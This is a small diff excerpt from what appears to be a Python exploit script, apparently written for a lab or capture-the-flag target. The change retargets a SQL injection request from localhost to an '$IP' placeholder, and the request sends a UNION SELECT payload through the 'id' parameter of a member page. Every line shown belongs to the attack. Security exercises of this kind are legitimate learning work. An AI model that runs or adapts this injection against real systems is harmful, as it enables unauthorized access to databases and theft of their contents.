@@ -20,7 +20,7 @@ try:
 except Exception as e:
     print(e)
 
-link = "http://localhost:10080/index.php?page=member&id=1+union+all+select+1%2C"+send+"&Submit=Submit#"
+link = "http://$IP/index.php?page=member&id=1+union+all+select+1%2C"+send+"&Submit=Submit#"
 f = requests.get(link)
 
 # print (f.text)
